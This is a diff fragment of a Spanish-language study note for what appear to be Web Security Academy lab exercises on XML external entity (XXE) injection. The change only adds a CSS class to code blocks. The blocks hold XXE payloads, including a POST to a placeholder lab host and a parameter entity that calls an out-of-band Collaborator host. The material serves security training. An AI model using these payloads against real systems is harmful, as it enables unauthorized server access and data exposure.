@@ -24,7 +24,7 @@ tags:
 > 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab/exploit) + el **objetivo** del ataque (archivo/URL/entidad).
 
 **Escalón 1 — entidad general externa:**
-<pre><code>POST /product/stock HTTP/1.1
+<pre class="payload"><code>POST /product/stock HTTP/1.1
 Host: <mark>TARGET.web-security-academy.net</mark>
 Content-Type: application/xml
 
@@ -33,7 +33,7 @@ Content-Type: application/xml
 &lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</code></pre>
 
 **Escalón 2 — si el 1 no dispara** (bloquea entidades **generales**), entidad de parámetro (`%`):
-<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+<pre class="payload"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "http://<mark>COLLAB.oastify.com</mark>"&gt; %xxe; ]&gt;
 &lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</code></pre>
 
